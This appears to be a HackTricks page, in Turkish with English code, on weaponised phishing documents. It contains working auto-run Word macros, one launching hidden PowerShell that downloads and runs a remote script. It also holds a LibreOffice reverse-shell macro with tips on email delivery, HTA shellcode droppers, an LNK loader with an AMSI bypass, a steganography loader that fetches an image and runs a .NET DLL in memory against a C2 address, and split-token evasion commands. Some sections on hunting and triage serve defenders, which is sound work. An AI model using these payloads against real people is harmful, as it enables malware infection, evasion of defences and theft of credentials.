# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması biçiminde gerçekleştirilir. Veri yapısının tanımlanması sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve macro çalıştırma özelliklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarımı gereği macro desteklemez; ancak RTF olarak yeniden adlandırılmış bir DOCM dosyası Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite'teki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makrolar içeren uzak bir template'e (File –Options –Add-ins –Manage: Templates –Go) referans veriyorsa makroları da “çalıştırabilir”.

### External Image Load

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Dokümandan arbitrary code çalıştırmak için makroları kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygınlarsa AV'nin bunları tespit etme olasılığı da o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** yolunu izleyin; bu işlem Document Inspector'ı açar. **Inspect** düğmesine, ardından **Document Properties and Personal Information** seçeneğinin yanındaki **Remove All** düğmesine tıklayın.

#### Doc Uzantısı

İşiniz bittiğinde **Save as type** açılır listesini seçin ve formatı **`.docx`** yerine **Word 97-2003 `.doc`** olarak değiştirin.\
Bunu yapın; çünkü **`.docx` dosyalarının içine macro'ları kaydedemezsiniz** ve macro etkin **`.docm`** uzantısının çevresinde bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` uzantısı en iyi uzlaşmadır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırılan macro'lar (Basic)

LibreOffice Writer belgeleri, macro'yu **Open Document** olayına bağlayarak Basic macro'larını içerebilir ve dosya açıldığında bunları otomatik olarak çalıştırabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şu şekilde görünür:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, değişmez tırnakları kaçışlamak için bunları kullanır; bu nedenle `...==""")` ile biten payload'lar hem iç komutu hem de Shell argümanını dengede tutar.

Delivery ipuçları:

- `.odt` olarak kaydedin ve macro'yu document event'e bağlayarak dosya açıldığında hemen çalışmasını sağlayın.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya adı dizesi değil, dosya baytları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP server'larını abuse ederken critical'dır.

## HTA Files

Bir HTA, **HTML ve scripting dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve browser'ın security model'ındaki kısıtlamalar olmadan "fully trusted" bir application olarak çalışır.

Bir HTA, genellikle **Internet Explorer ile birlikte installed** olan **`mshta.exe`** kullanılarak çalıştırılır; bu da **`mshta`'yı IE'ye dependent** hale getirir. Bu nedenle IE uninstalled edilmişse HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlama

**NTLM authentication'ı "uzaktan" zorlamanın** çeşitli yolları vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML içeriklerine **görünmez görseller** ekleyebilirsiniz (HTTP MitM bile olabilir). Ya da kurbana, yalnızca **klasörü açmasıyla** bir **authentication** işlemini **tetikleyecek** **dosya adresleri** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication'ı çalamayacağınızı, aynı zamanda **NTLM relay attacks** de gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili campaign'ler, iki meşru decoy document (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Buradaki trick, gerçek PowerShell loader'ın ZIP'in raw bytes verileri içinde benzersiz bir marker'dan sonra saklanması ve .lnk dosyasının bunu ayıklayıp tamamen memory içinde çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner tarafından uygulanan tipik flow:

1) Orijinal ZIP'i yaygın path'lerde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut working directory'nin parent directory'si.
2) ZIP bytes verilerini okuyun ve hardcoded bir marker bulun (ör. xFIQCV). Marker'dan sonraki her şey embedded PowerShell payload'ıdır.
3) ZIP'i %ProgramData% konumuna kopyalayın, orada extract edin ve meşru görünmek için decoy .docx dosyasını açın.
4) Mevcut process için AMSI'ı bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki stage'in obfuscation'ını kaldırın (ör. tüm # karakterlerini kaldırarak) ve bunu memory içinde execute edin.

Embedded stage'i ayıklayıp çalıştırmak için örnek PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Delivery often abuses reputable PaaS subdomains (ör. *.herokuapp.com) ve payload'ları gate edebilir (IP/UA'ya göre benign ZIP'ler sunar).
- Bir sonraki stage çoğunlukla base64/XOR shellcode'un şifresini çözer ve disk üzerindeki izleri en aza indirmek için Reflection.Emit + VirtualAlloc aracılığıyla execute eder.

Aynı chain'de kullanılan Persistence
- Microsoft Web Browser control'ün COM TypeLib hijacking'i; böylece IE/Explorer veya bunu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden launch eder.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılara ve kullanıma hazır komutlara buradan ulaşabilirsiniz:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Archive data'nın sonuna eklenmiş ASCII marker string'i (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için parent/user klasörlerini enumerate eden ve bir decoy document açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI tampering.
- Trusted PaaS domain'leri altında hosted link'lerle sona eren, uzun süre devam eden business thread'leri.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Başka bir recurring pattern, arka planda gerçek chain'i stage ederken hemen benign bir lure açan **document-impersonating `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen workflow:
1. Shortcut **PDF kılığına girer** ve obfuscated PowerShell downloader'ı spawn etmek için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, obvious token'ları (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalar; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan naive detection'lar komutu kaçırır.
3. Stager önce **decoy document'ı download eder**, victim için açar ve ardından malicious file'ları arka planda yeniden oluşturur.
4. Payload'lar **junk extension'larla** yazılabilir ve ardından filler karakterleri kaldırılarak rename edilebilir; bu işlem obvious `.exe` / `.cpl` artifact'larının ortaya çıkmasını geciktirir.
5. Persistence, user-writable bir path'ten trusted host binary başlatan **minute-based scheduled task** ile kurulur.

Bu pattern'den elde edilen minimal hunting ipuçları:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Tanınması gereken kullanışlı bir staging düzeni şöyledir:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir

Rapid7 vaka çalışmasında scheduled task, **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar çalıştırıyordu. **`APPWIZ.cpl`** dosyası bunun yanına yerleştirildiği ve **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary'si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load etti.

CPL ardından:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob'unu okur
- Blob'u **Windows CNG / `bcrypt.dll`** üzerinden decrypt eder
- Executable memory ayırır ve decrypt edilen shellcode'u kopyalar
- Shellcode pointer'ını **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı şekilde çalıştırır

Bu son adım ayrıca hunting için değerlidir: malware çoğu zaman doğrudan `((void(*)())buf)()` jump'ı kullanmak yerine, execution'ı aktarmak için **meşru bir callback alan WinAPI**'yi abuse eder.

Bu campaign'deki decrypt edilmiş payload, daha sonra final PE'yi tamamen memory içinde map eden ve execution'ı devretmeden önce mevcut process içindeki **AMSI/WLDP/ETW**'yi patch'leyen **Donut** shellcode'uydu. Side-loading ve memory-resident post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik hunting pivot'ları:
- Görünür bir decoy document'ı takip edecek şekilde `powershell.exe` veya `conhost.exe` çalıştıran `.lnk`.
- **`C:\Users\Public\`** konumuna yapılan kısa ömürlü download'lar ve ardından nonsense extension'larından hemen gerçekleştirilen rename işlemleri.
- `GoogleErrorReport` gibi sıradan adlara sahip, **user-writable directories** konumlarından execution yapan scheduled task'ler.
- Aynı non-system directory içindeki **`.cpl` / `.dll`** dosyalarını yükleyen trusted binary'ler.
- **`C:\Windows\Tasks\`** altında yazılan ve ardından side-loaded module tarafından okunan Base64 text blob'ları.

## Image dosyalarında steganography-delimited payload'lar (PowerShell stager)

Recent loader chain'ler, obfuscated bir JavaScript/VBS teslim eder; bu dosya, Base64 PowerShell stager'ını decode edip çalıştırır. Bu stager bir image (çoğunlukla GIF) download eder; image, benzersiz başlangıç/bitiş marker'ları arasında plain text olarak gizlenmiş Base64-encoded bir .NET DLL içerir. Script bu delimiter'ları arar (wild'da görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki text'i extract eder, Base64-decode ederek bytes'a dönüştürür, assembly'yi in-memory yükler ve bilinen bir entry method'u C2 URL ile invoke eder.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64'i decode eder → `-nop -w hidden -ep bypass` parametreleriyle PowerShell stager'ını başlatır.
- Stage 2: PowerShell stager → image download eder, marker-delimited Base64'ü carve eder, .NET DLL'yi in-memory yükler ve C2 URL ile options'ı geçirerek method'unu çağırır (ör. VAI).
- Stage 3: Loader final payload'ı alır ve genellikle process hollowing aracılığıyla trusted binary içine inject eder (yaygın olarak MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için bkz.:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir image'dan DLL carve etmek ve in-memory bir .NET method'u invoke etmek için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganography/marker-hiding).<sup>[[6]](#references)</sup> Marker'lar campaign'ler arasında değişir.
- Assembly yüklenmeden önce AMSI/ETW bypass ve string deobfuscation yaygın olarak uygulanır.
- Hunting: indirilen image'ları bilinen delimiter'lar için tarayın; image'lara erişen ve hemen ardından Base64 blob'larını decode eden PowerShell işlemlerini belirleyin.

Ayrıca stego tools ve carving techniques'e bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yaygın bir initial stage, bir archive içinde gönderilen küçük ve yoğun şekilde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki stage'i başlatmak için `-nop -w hidden -ep bypass` parametreleriyle PowerShell'i çalıştırmaktır.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Kendi file içeriğini oku
- Junk string'ler arasındaki bir Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `powershell.exe`'yi çağırarak `wscript.exe`/`cscript.exe` ile çalıştır

Hunting ipuçları
- Command line'da `-enc`/`FromBase64String` ile `powershell.exe` başlatan archived JS/VBS attachment'ları.
- User temp path'lerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## Execution container'ları olarak MSC documents (GrimResource)

Microsoft Management Console file'ları (`.msc`), normalde `mmc.exe` tarafından açılan XML console definition'larıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` resource'una yapılan bir `StringTable` reference'ını weaponize eder; böylece kullanıcının hazırlanmış console'u açması, JavaScript'in `mmc.exe` içinde çalışmasına neden olur. Gözlemlenen sample'lar, olağan Office-macro path'i olmadan bir .NET payload instantiate etmek için `transformNode` tabanlı obfuscation'ı **DotNetToJScript** ile birleştirmiştir.<sup>[[9]](#references)</sup>

Static triage için güvenilmeyen bir MSC'yi text olarak ele alın ve üzerine **double-click yapmayın**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Yüksek sinyalli çalışma zamanı pivotları arasında `mmc.exe`'nin CLR veya script bileşenlerini yüklemesi, ağ bağlantıları oluşturması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir executable başlatması bulunur. Format meşru olduğundan, tespitler her MSC'yi engellemek yerine **origin + şüpheli XML/script içeriği + `mmc.exe` davranışı** korelasyonunu kullanmalıdır.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload gating

Bir PDF'nin yararlı olması için exploit içermesi gerekmez. Güncel campaign'ler, iyi niyetli görünen bir belgeye **QR code veya sıradan bir link** yerleştirir, browser session'ını e-posta denetimlerinden uzaklaştırır ve hedefi alıcı adresiyle kişiselleştirir. Microsoft, QR URL'lerinin alıcı başına benzersiz olduğu ve RaccoonO365 credential-harvesting infrastructure'ına yönlendirdiği 2025 PDF'lerini belgeledi; paralel bir chain ise seçilen ziyaretçilere JavaScript/MSI path'i döndürmek, scanner'lara veya izin verilmeyen client'lara ise benign bir PDF sunmak için IP/environment gating kullandı.<sup>[[10]](#references)</sup>

Hem PDF action'larını hem de render edilmiş QR code'larını triage edin. Bir QR, extract edilebilir bir image olarak saklanmak yerine vector olarak çizilmiş olabilir; bu nedenle embedded image'ları çıkarmanın yanı sıra her page'i rasterize edin:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
İzole bir analysis system üzerinden, kimlik doğrulaması yapmadan decode edilmiş hedefleri ve redirect'leri inceleyin. Yararlı hunting özellikleri arasında neredeyse boş mail body'lerine sahip yalnızca QR içeren PDF'ler, query parameter içine gömülmüş recipient email, reputable hosting üzerinden gerçekleşen birden fazla redirect ve IP, geolocation, cookies, referrer veya user agent'a göre döndürülen farklı içerikler bulunur. İstekleri kontrollü profillerle karşılaştırın; tek bir sandbox fetch işlemi yalnızca decoy içeriği alabilir.<sup>[[10]](#references)</sup>

## Windows files to steal NTLM hashes

**NTLM creds çalınabilecek yerlere** ayrılmış sayfayı kontrol edin:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD şirketlerini hedefleyen gelişmiş bir Phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Dropping Elephant'ın China temalı loader chain üzerinden tradecraft'ını izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar dağıtıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: initial access ve evasion için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actor'lar tax temalı Phishing campaign'leri dağıtmak için tax season'dan yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
